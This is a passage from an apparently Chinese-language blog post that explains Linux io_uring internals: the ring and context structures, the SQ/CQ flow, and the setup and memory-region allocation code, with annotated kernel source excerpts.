flags</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * Written by the kernel, shouldn&#x27;t be modified by the</span></span><br><span class="line"><span class="comment">	 * application.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * The application needs a full memory barrier before checking</span></span><br><span class="line"><span class="comment">	 * for IORING_SQ_NEED_WAKEUP after updating the sq tail.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">atomic_t</span>		sq_flags;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Runtime CQ flags</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * Written by the application, shouldn&#x27;t be modified by the</span></span><br><span class="line"><span class="comment">	 * kernel.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	u32			cq_flags;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Number of completion events lost because the queue was full;</span></span><br><span class="line"><span class="comment">	 * this should be avoided by the application by making sure</span></span><br><span class="line"><span class="comment">	 * there are not more requests pending than there is space in</span></span><br><span class="line"><span class="comment">	 * the completion queue.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * Written by the kernel, shouldn&#x27;t be modified by the</span></span><br><span class="line"><span class="comment">	 * application (i.e. get number of &quot;new events&quot; by comparing to</span></span><br><span class="line"><span class="comment">	 * cached value).</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * As completion events come in out of order this counter is not</span></span><br><span class="line"><span class="comment">	 * ordered with any other data.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	u32			cq_overflow;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Ring buffer of completion events.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * The kernel writes completion events fresh every time they are</span></span><br><span class="line"><span class="comment">	 * produced, so the application is allowed to modify pending</span></span><br><span class="line"><span class="comment">	 * entries.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_uring_cqe</span>	<span class="title">cqes</span>[] ____<span class="title">cacheline_aligned_in_smp</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>而 io_rings 与 io_uring_sqe 数组以及其他相关数据结构体实际上会被封装到 io_ring_ctx 结构体中，即 io_uring 上下文。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_ring_ctx</span> &#123;</span></span><br><span class="line">	<span class="comment">/* const or read-mostly hot data */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span>		flags;</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span>		drain_next: <span class="number">1</span>;</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span>		restricted: <span class="number">1</span>;</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span>		off_timeout_used: <span class="number">1</span>;</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span>		drain_active: <span class="number">1</span>;</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span>		has_evfd: <span class="number">1</span>;</span><br><span class="line">		<span class="comment">/* all CQEs should be posted only by the submitter task */</span></span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span>		task_complete: <span class="number">1</span>;</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span>		lockless_cq: <span class="number">1</span>;</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span>		syscall_iopoll: <span class="number">1</span>;</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span>		poll_activated: <span class="number">1</span>;</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span>		drain_disabled: <span class="number">1</span>;</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span>		compat: <span class="number">1</span>;</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span>		iowq_limits_set : <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span>	*<span class="title">submitter_task</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">io_rings</span>		*<span class="title">rings</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">percpu_ref</span>	<span class="title">refs</span>;</span></span><br><span class="line"></span><br><span class="line">		<span class="type">clockid_t</span>		clockid;</span><br><span class="line">		<span class="class"><span class="keyword">enum</span> <span class="title">tk_offsets</span>		<span class="title">clock_offset</span>;</span></span><br><span class="line"></span><br><span class="line">		<span class="class"><span class="keyword">enum</span> <span class="title">task_work_notify_mode</span>	<span class="title">notify_method</span>;</span></span><br><span class="line">		<span class="type">unsigned</span>			sq_thread_idle;</span><br><span class="line">	&#125; ____cacheline_aligned_in_smp;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* submission data */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span>		<span class="title">uring_lock</span>;</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Ring buffer of indices into array of io_uring_sqe, which is</span></span><br><span class="line"><span class="comment">		 * mmapped by the application using the IORING_OFF_SQES offset.</span></span><br><span class="line"><span class="comment">		 *</span></span><br><span class="line"><span class="comment">		 * This indirection could e.g. be used to assign fixed</span></span><br><span class="line"><span class="comment">		 * io_uring_sqe entries to operations and only submit them to</span></span><br><span class="line"><span class="comment">		 * the queue when needed.</span></span><br><span class="line"><span class="comment">		 *</span></span><br><span class="line"><span class="comment">		 * The kernel modifies neither the indices array nor the entries</span></span><br><span class="line"><span class="comment">		 * array.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		u32			*sq_array;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span>	*<span class="title">sq_sqes</span>;</span></span><br><span class="line">		<span class="type">unsigned</span>		cached_sq_head;</span><br><span class="line">		<span class="type">unsigned</span>		sq_entries;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Fixed resources fast path, should be accessed only under</span></span><br><span class="line"><span class="comment">		 * uring_lock, and updated through io_uring_register(2)</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="type">atomic_t</span>		cancel_seq;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * -&gt;iopoll_list is protected by the ctx-&gt;uring_lock for</span></span><br><span class="line"><span class="comment">		 * io_uring instances that don&#x27;t use IORING_SETUP_SQPOLL.</span></span><br><span class="line"><span class="comment">		 * For SQPOLL, only the single threaded io_sq_thread() will</span></span><br><span class="line"><span class="comment">		 * manipulate the list, hence no extra locking is needed there.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="type">bool</span>			poll_multi_queue;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">io_wq_work_list</span>	<span class="title">iopoll_list</span>;</span></span><br><span class="line"></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">io_file_table</span>	<span class="title">file_table</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">io_rsrc_data</span>	<span class="title">buf_table</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">io_alloc_cache</span>	<span class="title">node_cache</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">io_alloc_cache</span>	<span class="title">imu_cache</span>;</span></span><br><span class="line"></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">io_submit_state</span>	<span class="title">submit_state</span>;</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Modifications are protected by -&gt;uring_lock and -&gt;mmap_lock.</span></span><br><span class="line"><span class="comment">		 * The flags, buf_pages and buf_nr_pages fields should be stable</span></span><br><span class="line"><span class="comment">		 * once published.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">xarray</span>		<span class="title">io_bl_xa</span>;</span></span><br><span class="line"></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">io_hash_table</span>	<span class="title">cancel_table</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">io_alloc_cache</span>	<span class="title">apoll_cache</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">io_alloc_cache</span>	<span class="title">netmsg_cache</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">io_alloc_cache</span>	<span class="title">rw_cache</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">io_alloc_cache</span>	<span class="title">cmd_cache</span>;</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Any cancelable uring_cmd is added to this list in</span></span><br><span class="line"><span class="comment">		 * -&gt;uring_cmd() by io_uring_cmd_insert_cancelable()</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">hlist_head</span>	<span class="title">cancelable_uring_cmd</span>;</span></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * For Hybrid IOPOLL, runtime in hybrid polling, without</span></span><br><span class="line"><span class="comment">		 * scheduling time</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		u64					hybrid_poll_time;</span><br><span class="line">	&#125; ____cacheline_aligned_in_smp;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="基本过程"><a href="#基本过程" class="headerlink" title="基本过程"></a>基本过程</h3><p>io_uring 的基本流程如下（a3 博客这里是不是弄混了?）：</p>
<ul>
<li>SQ 存放用户请求 SQE，用户维护 SQ::Tail</li>
<li>内核从 SQ 读取 SQE，内核维护 SQ::Head</li>
<li>内核完成请求将结果封装到 CQE 并放到 CQ 队列中，内核维护 CQ::Tail</li>
<li>用户读取 CQ 完成感知，用户维护 CQ::Head</li>
</ul>
<p>数据更新通过 共享内存完成，蒸锅过程采用异步、非阻塞、轮询的思想</p>
<h2 id="io-uring-相关系统调用"><a href="#io-uring-相关系统调用" class="headerlink" title="io_uring 相关系统调用"></a>io_uring 相关系统调用</h2><p>io_uring 架构引入三个相关系统调用：</p>
<ul>
<li>io_uring_setup()：创建 io_uring 上下文，主要是创建 SQ 和 CQ 队列，并指定 queue 的元素数量；该系统调用会返回一个文件描述符来进行操作</li>
<li>io_uring_register()：操作用于异步 I&#x2F;O 的<strong>文件或用户缓冲区</strong>（files or user buffers），主要有注册（在内核中创建新的缓冲区）、更新（更新缓冲区内容）、注销（释放缓冲区）等操作，已经注册的缓冲区大小无法调整</li>
<li>io_uring_enter()：提交新的 I&#x2F;O 请求，可以选择是否等待 I&#x2F;O 完成</li>
</ul>
<h3 id="io-uring-setup"><a href="#io-uring-setup" class="headerlink" title="io_uring_setup()"></a>io_uring_setup()</h3><p>核心处理函数为 </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> __cold <span class="type">int</span> <span class="title function_">io_uring_create</span><span class="params">(<span class="type">unsigned</span> entries, <span class="keyword">struct</span> io_uring_params *p,</span></span><br><span class="line"><span class="params">				  <span class="keyword">struct</span> io_uring_params __user *params)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_ring_ctx</span> *<span class="title">ctx</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_uring_task</span> *<span class="title">tctx</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">	<span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">	ret = io_uring_sanitise_params(p);</span><br><span class="line">	<span class="keyword">if</span> (ret)</span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">	ret = io_uring_fill_params(entries, p);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(ret))</span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">	ctx = io_ring_ctx_alloc(p);		<span class="comment">// 分配 io_ring_ctx，kzalloc,GFP_KERNEL</span></span><br><span class="line">	<span class="keyword">if</span> (!ctx)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	ctx-&gt;clockid = CLOCK_MONOTONIC;</span><br><span class="line">	ctx-&gt;clock_offset = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!(ctx-&gt;flags &amp; IORING_SETUP_NO_SQARRAY))</span><br><span class="line">		static_branch_inc(&amp;io_key_has_sqarray);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((ctx-&gt;flags &amp; IORING_SETUP_DEFER_TASKRUN) &amp;&amp;</span><br><span class="line">	    !(ctx-&gt;flags &amp; IORING_SETUP_IOPOLL) &amp;&amp;</span><br><span class="line">	    !(ctx-&gt;flags &amp; IORING_SETUP_SQPOLL))</span><br><span class="line">		ctx-&gt;task_complete = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ctx-&gt;task_complete || (ctx-&gt;flags &amp; IORING_SETUP_IOPOLL))</span><br><span class="line">		ctx-&gt;lockless_cq = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * lazy poll_wq activation relies on -&gt;task_complete for synchronisation</span></span><br><span class="line"><span class="comment">	 * purposes, see io_activate_pollwq()</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (!ctx-&gt;task_complete)</span><br><span class="line">		ctx-&gt;poll_activated = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * When SETUP_IOPOLL and SETUP_SQPOLL are both enabled, user</span></span><br><span class="line"><span class="comment">	 * space applications don&#x27;t need to do io completion events</span></span><br><span class="line"><span class="comment">	 * polling again, they can rely on io_sq_thread to do polling</span></span><br><span class="line"><span class="comment">	 * work, which can reduce cpu usage and uring_lock contention.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (ctx-&gt;flags &amp; IORING_SETUP_IOPOLL &amp;&amp;</span><br><span class="line">	    !(ctx-&gt;flags &amp; IORING_SETUP_SQPOLL))</span><br><span class="line">		ctx-&gt;syscall_iopoll = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	ctx-&gt;compat = in_compat_syscall();</span><br><span class="line">	<span class="keyword">if</span> (!ns_capable_noaudit(&amp;init_user_ns, CAP_IPC_LOCK))</span><br><span class="line">		ctx-&gt;user = get_uid(current_user());</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * For SQPOLL, we just need a wakeup, always. For !SQPOLL, if</span></span><br><span class="line"><span class="comment">	 * COOP_TASKRUN is set, then IPIs are never needed by the app.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (ctx-&gt;flags &amp; (IORING_SETUP_SQPOLL|IORING_SETUP_COOP_TASKRUN))</span><br><span class="line">		ctx-&gt;notify_method = TWA_SIGNAL_NO_IPI;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		ctx-&gt;notify_method = TWA_SIGNAL;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * This is just grabbed for accounting purposes. When a process exits,</span></span><br><span class="line"><span class="comment">	 * the mm is exited and dropped before the files, hence we need to hang</span></span><br><span class="line"><span class="comment">	 * on to this mm purely for the purposes of being able to unaccount</span></span><br><span class="line"><span class="comment">	 * memory (locked/pinned vm). It&#x27;s not used for anything else.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	mmgrab(current-&gt;mm);</span><br><span class="line">	ctx-&gt;mm_account = current-&gt;mm;</span><br><span class="line"></span><br><span class="line">	ret = io_allocate_scq_urings(ctx, p);	<span class="comment">// 分配 io_rings以及页面，这里会有很多内存分配</span></span><br><span class="line">	<span class="keyword">if</span> (ret)</span><br><span class="line">		<span class="keyword">goto</span> err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!(p-&gt;flags &amp; IORING_SETUP_NO_SQARRAY))</span><br><span class="line">		p-&gt;sq_off.<span class="built_in">array</span> = (<span class="type">char</span> *)ctx-&gt;sq_array - (<span class="type">char</span> *)ctx-&gt;rings;</span><br><span class="line"></span><br><span class="line">	ret = io_sq_offload_create(ctx, p);		<span class="comment">// 初始化 SQ，主要关于 WQ 和 SQPOOL</span></span><br><span class="line">	<span class="keyword">if</span> (ret)</span><br><span class="line">		<span class="keyword">goto</span> err;</span><br><span class="line"></span><br><span class="line">	p-&gt;features = IORING_FEAT_SINGLE_MMAP | IORING_FEAT_NODROP |</span><br><span class="line">			IORING_FEAT_SUBMIT_STABLE | IORING_FEAT_RW_CUR_POS |</span><br><span class="line">			IORING_FEAT_CUR_PERSONALITY | IORING_FEAT_FAST_POLL |</span><br><span class="line">			IORING_FEAT_POLL_32BITS | IORING_FEAT_SQPOLL_NONFIXED |</span><br><span class="line">			IORING_FEAT_EXT_ARG | IORING_FEAT_NATIVE_WORKERS |</span><br><span class="line">			IORING_FEAT_RSRC_TAGS | IORING_FEAT_CQE_SKIP |</span><br><span class="line">			IORING_FEAT_LINKED_FILE | IORING_FEAT_REG_REG_RING |</span><br><span class="line">			IORING_FEAT_RECVSEND_BUNDLE | IORING_FEAT_MIN_TIMEOUT |</span><br><span class="line">			IORING_FEAT_RW_ATTR | IORING_FEAT_NO_IOWAIT;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (copy_to_user(params, p, <span class="keyword">sizeof</span>(*p))) &#123;</span><br><span class="line">		ret = -EFAULT;</span><br><span class="line">		<span class="keyword">goto</span> err;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ctx-&gt;flags &amp; IORING_SETUP_SINGLE_ISSUER</span><br><span class="line">	    &amp;&amp; !(ctx-&gt;flags &amp; IORING_SETUP_R_DISABLED))</span><br><span class="line">		WRITE_ONCE(ctx-&gt;submitter_task, get_task_struct(current));</span><br><span class="line"></span><br><span class="line">	file = io_uring_get_file(ctx);		<span class="comment">// 获取文件描述符</span></span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(file)) &#123;</span><br><span class="line">		ret = PTR_ERR(file);</span><br><span class="line">		<span class="keyword">goto</span> err;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ret = __io_uring_add_tctx_node(ctx);<span class="comment">// 分配进程上下文</span></span><br><span class="line">	<span class="keyword">if</span> (ret)</span><br><span class="line">		<span class="keyword">goto</span> err_fput;</span><br><span class="line">	tctx = current-&gt;io_uring;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Install ring fd as the very last thing, so we don&#x27;t risk someone</span></span><br><span class="line"><span class="comment">	 * having closed it before we finish setup</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (p-&gt;flags &amp; IORING_SETUP_REGISTERED_FD_ONLY)</span><br><span class="line">		ret = io_ring_add_registered_file(tctx, file, <span class="number">0</span>, IO_RINGFD_REG_MAX);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		ret = io_uring_install_fd(file);</span><br><span class="line">	<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> err_fput;</span><br><span class="line"></span><br><span class="line">	trace_io_uring_create(ret, ctx, p-&gt;sq_entries, p-&gt;cq_entries, p-&gt;flags);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">err:</span><br><span class="line">	io_ring_ctx_wait_and_kill(ctx);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">err_fput:</span><br><span class="line">	fput(file);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 io_allocate_scq_urings 分配了很多内存结构，主要为：</p>
<ul>
<li>kvmalloc 分配一个指针数组（ <code>GFP_KERNEL_ACCOUNT | __GFP_ZERO</code>）</li>
<li><code>io_mem_alloc_compound()</code> 走 <code>alloc_pages()</code> 先对齐 order 再 <strong>一次性分配指针数组的页面</strong> 后进行填充</li>
<li>调用 <code>alloc_pages_bulk_node</code> 进行页面分配（大概是 <strong>一张一张分配一整个 page 数组</strong> ， <del>具体的内部没细看</del> ）</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">io_region_allocate_pages</span><span class="params">(<span class="keyword">struct</span> io_ring_ctx *ctx,</span></span><br><span class="line"><span class="params">				    <span class="keyword">struct</span> io_mapped_region *mr,</span></span><br><span class="line"><span class="params">				    <span class="keyword">struct</span> io_uring_region_desc *reg,</span></span><br><span class="line"><span class="params">				    <span class="type">unsigned</span> <span class="type">long</span> mmap_offset)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">gfp_t</span> gfp = GFP_KERNEL_ACCOUNT | __GFP_ZERO | __GFP_NOWARN;</span><br><span class="line">	<span class="type">size_t</span> size = (<span class="type">size_t</span>) mr-&gt;nr_pages &lt;&lt; PAGE_SHIFT;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> nr_allocated;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> **<span class="title">pages</span>;</span></span><br><span class="line">	<span class="type">void</span> *p;</span><br><span class="line"></span><br><span class="line">	pages = kvmalloc_array(mr-&gt;nr_pages, <span class="keyword">sizeof</span>(*pages), gfp);</span><br><span class="line">	<span class="keyword">if</span> (!pages)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	p = io_mem_alloc_compound(pages, mr-&gt;nr_pages, size, gfp);</span><br><span class="line">	<span class="keyword">if</span> (!IS_ERR(p)) &#123;</span><br><span class="line">		mr-&gt;flags |= IO_REGION_F_SINGLE_REF;</span><br><span class="line">		<span class="keyword">goto</span> done;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	nr_allocated = alloc_pages_bulk_node(gfp, NUMA_NO_NODE,</span><br><span class="line">					     mr-&gt;nr_pages, pages);</span><br><span class="line">	<span class="keyword">if</span> (nr_allocated != mr-&gt;nr_pages) &#123;</span><br><span class="line">		<span class="keyword">if</span> (nr_allocated)</span><br><span class="line">			release_pages(pages, nr_allocated);</span><br><span class="line">		kvfree(pages);</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">	&#125;</span><br><span class="line">done:</span><br><span class="line">	reg-&gt;mmap_offset = mmap_offset;</span><br><span class="line">	mr-&gt;pages = pages;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">io_create_region</span><span class="params">(<span class="keyword">struct</span> io_ring_ctx *ctx, <span class="keyword">struct</span> io_mapped_region *mr,</span></span><br><span class="line"><span class="params">		     <span class="keyword">struct</span> io_uring_region_desc *reg,</span></span><br><span class="line"><span class="params">		     <span class="type">unsigned</span> <span class="type">long</span> mmap_offset)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> nr_pages, ret;</span><br><span class="line">	u64 end;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (WARN_ON_ONCE(mr-&gt;pages || mr-&gt;ptr || mr-&gt;nr_pages))</span><br><span class="line">		<span class="keyword">return</span> -EFAULT;</span><br><span class="line">	<span class="keyword">if</span> (memchr_inv(&amp;reg-&gt;__resv, <span class="number">0</span>, <span class="keyword">sizeof</span>(reg-&gt;__resv)))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	<span class="keyword">if</span> (reg-&gt;flags &amp; ~IORING_MEM_REGION_TYPE_USER)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	<span class="comment">/* user_addr should be set IFF it&#x27;s a user memory backed region */</span></span><br><span class="line">	<span class="keyword">if</span> ((reg-&gt;flags &amp; IORING_MEM_REGION_TYPE_USER) != !!reg-&gt;user_addr)</span><br><span class="line">		<span class="keyword">return</span> -EFAULT;</span><br><span class="line">	<span class="keyword">if</span> (!reg-&gt;size || reg-&gt;mmap_offset || reg-&gt;id)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	<span class="keyword">if</span> ((reg-&gt;size &gt;&gt; PAGE_SHIFT) &gt; INT_MAX)</span><br><span class="line">		<span class="keyword">return</span> -E2BIG;</span><br><span class="line">	<span class="keyword">if</span> ((reg-&gt;user_addr | reg-&gt;size) &amp; ~PAGE_MASK)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	<span class="keyword">if</span> (check_add_overflow(reg-&gt;user_addr, reg-&gt;size, &amp;end))</span><br><span class="line">		<span class="keyword">return</span> -EOVERFLOW;</span><br><span class="line"></span><br><span class="line">	nr_pages = reg-&gt;size &gt;&gt; PAGE_SHIFT;</span><br><span class="line">	<span class="keyword">if</span> (ctx-&gt;user) &#123;</span><br><span class="line">		ret = __io_account_mem(ctx-&gt;user, nr_pages);</span><br><span class="line">		<span class="keyword">if</span> (ret)</span><br><span class="line">			<span class="keyword">return</span> ret;</span><br><span class="line">	&#125;</span><br><span class="line">	mr-&gt;nr_pages = nr_pages;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (reg-&gt;flags &amp; IORING_MEM_REGION_TYPE_USER)</span><br><span class="line">		ret = io_region_pin_pages(ctx, mr, reg);	<span class="comment">// 用户应用分配页面，可直接供内核使用</span></span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		ret = io_region_allocate_pages(ctx, mr, reg, mmap_offset);	<span class="comment">// 内核提供页面</span></span><br><span class="line">	<span class="keyword">if</span> (ret)</span><br><span class="line">		<span class="keyword">goto</span> out_free;</span><br><span class="line"></span><br><span class="line">	ret = io_region_init_ptr(mr);</span><br><span class="line">	<span class="keyword">if</span> (ret)</span><br><span class="line">		<span class="keyword">goto</span> out_free;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">out_free:</span><br><span class="line">	io_free_region(ctx, mr);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __cold <span class="type">int</span> <span class="title function_">io_allocate_scq_urings</span><span class="params">(<span class="keyword">struct</span> io_ring_ctx *ctx,</span></span><br><span class="line"><span class="params">					 <span class="keyword">struct</span> io_uring_params *p)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_uring_region_desc</span> <span class="title">rd</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_rings</span> *<span class="title">rings</span>;</span></span><br><span class="line">	<span class="type">size_t</span> size, sq_array_offset;</span><br><span class="line">	<span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* make sure these are sane, as we already accounted them */</span></span><br><span class="line">	ctx-&gt;sq_entries = p-&gt;sq_entries;</span><br><span class="line">	ctx-&gt;cq_entries = p-&gt;cq_entries;</span><br><span class="line"></span><br><span class="line">	size = rings_size(ctx-&gt;flags, p-&gt;sq_entries, p-&gt;cq_entries,</span><br><span class="line">			  &amp;sq_array_offset);</span><br><span class="line">	<span class="keyword">if</span> (size == SIZE_MAX)</span><br><span class="line">		<span class="keyword">return</span> -EOVERFLOW;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(&amp;rd, <span class="number">0</span>, <span class="keyword">sizeof</span>(rd));</span><br><span class="line">	rd.size = PAGE_ALIGN(size);</span><br><span class="line">	<span class="keyword">if</span> (ctx-&gt;flags &amp; IORING_SETUP_NO_MMAP) &#123;</span><br><span class="line">		rd.user_addr = p-&gt;cq_off.user_addr;</span><br><span class="line">		rd.flags |= IORING_MEM_REGION_TYPE_USER;</span><br><span class="line">	&#125;</span><br><span class="line">	ret = io_create_region(ctx, &amp;ctx-&gt;ring_region, &amp;rd, IORING_OFF_CQ_RING);</span><br><span class="line">	<span class="keyword">if</span> (ret)</span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line">	ctx-&gt;rings = rings = io_region_get_ptr(&amp;ctx-&gt;ring_region);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!(ctx-&gt;flags &amp; IORING_SETUP_NO_SQARRAY))</span><br><span class="line">		ctx-&gt;sq_array = (u32 *)((<span class="type">char</span> *)rings + sq_array_offset);</span><br><span class="line">	rings-&gt;sq_ring_mask = p-&gt;sq_entries - <span class="number">1</span>;</span><br><span class="line">	rings-&gt;cq_ring_mask = p-&gt;cq_entries - <span class="number">1</span>;</span><br><span class="line">	rings-&gt;sq_ring_entries = p-&gt;sq_entries;</span><br><span class="line">	rings-&gt;cq_ring_entries = p-&gt;cq_entries;</span><br><span 